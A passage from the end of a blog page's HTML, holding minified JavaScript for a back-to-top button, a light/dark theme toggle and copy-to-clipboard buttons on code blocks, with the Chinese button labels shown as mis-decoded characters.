mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>400||document.documentElement.scrollTop>400?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="ğŸ“„å¤åˆ¶";function s(){t.innerText="ğŸ‘ŒğŸ»å·²å¤åˆ¶!",setTimeout(()=>{t.innerText="ğŸ“„å¤åˆ¶"},2e3)}t.addEventListener("click",t=>{const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>